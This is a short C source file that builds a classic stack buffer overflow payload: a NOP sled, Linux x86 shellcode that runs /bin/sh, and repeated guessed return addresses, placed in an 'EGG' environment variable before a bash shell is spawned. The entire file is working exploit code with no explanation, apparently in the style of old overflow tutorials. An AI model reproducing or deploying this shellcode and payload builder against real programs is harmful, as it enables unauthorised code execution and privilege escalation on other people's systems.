#include <stdio.h>
#include <stdlib.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 300
#define NOP 0x90

unsigned char shellcode[] = 
	  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  	  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned int get_sp(void) {
	__asm__("movl %esp, %eax");
}

void main(int argc, char *argv[]) {
	unsigned char *buff, *ptr;
	int *addr_ptr, addr;
	int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
	int i, residue;

	if (argc > 1) offset = atoi(argv[1]);

	if(!(buff = malloc(bsize))) {
		printf("Can't allocate memory.\n");
		exit(0);
	}

	addr = get_sp() - offset;
	printf("Using address: 0x%x\n", addr);

	ptr = buff;
	addr_ptr = (int *) ptr;

	for(i = 0 ; i < bsize ; i +=4) *(addr_ptr++) = addr;
	for(i = 0 ; i < 80 ; i ++) buff[i] = NOP;
	ptr = buff + 80;
	for(i = 0 ; i < strlen(shellcode) ; i ++) *(ptr++) = shellcode[i];
	buff[bsize - 1] = '\0';

	memcpy(buff, "EGG=", 4);
	putenv(buff);
	system("/bin/bash");
}

